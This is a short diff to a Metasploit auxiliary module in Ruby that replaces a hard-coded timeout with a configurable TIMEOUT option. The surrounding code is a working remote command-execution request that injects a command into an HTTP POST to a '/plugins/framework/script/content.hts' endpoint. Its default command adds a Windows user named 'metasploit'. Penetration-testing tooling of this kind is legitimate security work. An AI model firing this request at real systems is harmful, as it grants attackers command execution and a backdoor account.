@@ -37,7 +37,12 @@ class Metasploit3 < Msf::Auxiliary
         [
           Opt::RPORT(8000),
           OptString.new('CMD', [ false, "The command to execute.", "net user metasploit password /add" ]),
+          OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 3])
         ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 3
   end
 
   def run
@@ -47,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/plugins/framework/script/content.hts',
         'method'  => 'POST',
         'data'    => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',)'
-      }, 3)
+      }, timeout)
   end
 
 end
